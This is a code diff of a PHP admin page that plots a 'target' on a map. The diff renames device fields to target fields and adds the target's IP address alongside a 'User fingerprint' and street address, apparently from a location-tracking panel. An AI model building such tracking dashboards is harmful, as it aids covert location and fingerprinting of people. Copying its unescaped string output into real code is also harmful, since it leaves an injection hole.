@@ -41,7 +41,7 @@ if (!isset($_SESSION['login']))
         <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon.png">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 
-	<title> Device Location </title>
+	<title> Target Location </title>
 
 
     <style>
@@ -97,6 +97,7 @@ $admin = $_SESSION['login'];
       {
        $map_location = input($_POST['map_location']);
 
+
        $lat = explode(",", $map_location, 2);
        $lat = $lat[0];
 
@@ -111,18 +112,25 @@ $admin = $_SESSION['login'];
       $text_part2 = substr($text_part2, 1);
    
 
-      $device_id = explode("-", $text_part2, 2);
-      $device_id = $device_id[0];
+      $target_id = explode("-", $text_part2, 2);
+      $target_id = $target_id[0];
 
-      $address = strstr($text_part2, '-');
-      $address = substr($address, 1);
+
+      $text_part3 = strstr($text_part2, '-');
+      $text_part3 = substr($text_part3, 1);
+
+      $address = explode("-", $text_part3, 2);
+      $address = $address[0];
  
 
-    #print map_location
+      $ip = strstr($text_part3, '-');
+      $ip = substr($ip, 1);
 
     
 
-   $all_info_marker  = "'User fingerprint: "  . $device_id . "<br>"   . "Address: " . $address . "'"; 
+   $all_info_marker  = "'User fingerprint: "  . $target_id . "<br>" . "IP Address: " . $ip . "<br>"  . "Address: " . $address . "'"; 
+
+
 
     echo'<div id="map"></div>';
 
